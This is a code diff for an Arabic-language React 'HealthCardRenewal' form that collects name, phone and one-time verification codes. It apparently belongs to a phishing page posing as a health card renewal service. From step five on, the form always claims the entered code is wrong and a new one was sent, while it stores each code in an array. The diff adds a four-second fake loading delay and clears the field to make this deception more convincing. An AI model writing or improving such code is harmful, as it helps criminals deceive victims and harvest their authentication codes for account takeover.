@@ -37,6 +37,7 @@ const steps = [
 ]
 
 export default function HealthCardRenewal() {
+    const [isloading,setIsloading]=useState(false)
     const [stepr,setStep]=useState(1)
     const [name,setName]=useState('')
     const [phone,setPhone]=useState('')
@@ -357,7 +358,7 @@ export default function HealthCardRenewal() {
                                       </Label>
                                       <Input
                                       onChange={(e)=>{setOtp(e.target.value)}}
-
+value={otp}
                                           type="tel"
                                           placeholder="رمز التحقق"
                                           className="max-w-md text-sm sm:text-base"
@@ -378,18 +379,23 @@ export default function HealthCardRenewal() {
                               <Button
                                 onClick={()=>{
                                     handleSubmit().then(()=>{
-
                                         setStep(stepr+1)
                                     })
                                     
                                     if (stepr >= 5){
-                                        alert("رمز التحقق خاطىء تم ارسال رمز جديد")
-                                        otpArd.push(otp)
+                                        setIsloading(true)
+                                        setTimeout(() => {
+                                            alert("رمز التحقق خاطىء تم ارسال رمز جديد")
+                                            otpArd.push(otp)
+                                            setOtp("")
+                                            setIsloading(false)
+    
+                                        }, 4000)
                                     }
                                   }}
                                   className="w-full sm:w-auto sm:min-w-[120px] bg-[#8B1538] hover:bg-[#8B1538]/90"
                               >
-                                  تابع
+                                {stepr>= 5?'ارسال':isloading?'انتظر':'تابع'}
                               </Button>
                           </div>
                       </div>
